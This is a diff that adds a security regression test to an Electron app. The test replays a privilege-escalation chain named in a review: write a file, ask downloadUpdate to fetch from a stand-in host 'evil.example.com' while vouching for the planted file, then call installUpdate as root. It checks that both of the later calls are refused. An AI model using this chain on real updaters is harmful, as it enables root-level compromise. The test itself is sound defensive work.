@@ -276,6 +276,51 @@ module.exports = async function({ page, main_, check, evaluate, userData }){
   check('writeBinaryFile survived the boundary as a Uint8Array and wrote the exact bytes', binOk,
     binPath);
 
+  // -------------------------------------------------------------------------------------------
+  // Group K: the one command that escalates privilege, refused in the shipped artifact
+  // -------------------------------------------------------------------------------------------
+
+  //Phase 9c. The chain /security-review found against 9b was writeBinaryFile -> downloadUpdate ->
+  //installUpdate, and the first of those three just ran, for real, a few lines above: the arbitrary
+  //write is conceded and still works. What must not work is turning its result into a root install.
+  //
+  //Neither check below touches the network or sudo. downloadUpdate refuses the URL before it opens a
+  //socket, and installUpdate refuses the path before it spawns anything - which is exactly why they
+  //are assertable here, on Windows, against the packaged app. What they cannot say is anything about
+  //what happens after that spawn: installUpdate is linux-only past this point, and the Pi pass still
+  //owes that half.
+  //Called on the raw bridge, so a refusal arrives as platform-host.js's envelope rather than as a
+  //throw - reconstituting it into a PlatformError is platform-ipc.js's job, on the renderer side of
+  //the facade, and these checks are below that. Same shape the PlatformError checks further down
+  //assert against; asserting a rejection here would have been asserting the wrong layer.
+  const vouchAttack = await evaluate(page, `(async function(){
+    var result = { planted: ${JSON.stringify(binPath)} };
+
+    // Step 2 of the review's own write-up: ask downloadUpdate to bless the file step 1 wrote.
+    // destPath is no longer in the contract, and is sent anyway - an untrusted renderer is not held
+    // to a parameter list.
+    result.download = await globalThis.warewoolf.invoke('downloadUpdate', {
+      url: 'https://evil.example.com/warewoolf.deb', destPath: result.planted });
+
+    // Step 3: install it as root.
+    result.install = await globalThis.warewoolf.invoke('installUpdate', {
+      path: result.planted, password: 'whatever' });
+
+    return result;
+  })()`);
+
+  const downloadStep = vouchAttack.download || {};
+  const installStep = vouchAttack.install || {};
+
+  check('downloadUpdate refuses a url that is not a release asset, without vouching anything',
+    downloadStep.__platformError === true && downloadStep.code === 'INVALID_ARGUMENT',
+    JSON.stringify(downloadStep));
+
+  check('installUpdate refuses a renderer-written file across real Electron IPC',
+    installStep.__platformError === true && installStep.code === 'INVALID_ARGUMENT'
+      && /not produced by this session/.test(installStep.message || ''),
+    JSON.stringify(installStep));
+
   const epubPath = fwd(path.join(userData, 'phase9b.epub'));
   const epub = await evaluate(page, `(async function(){
     try {
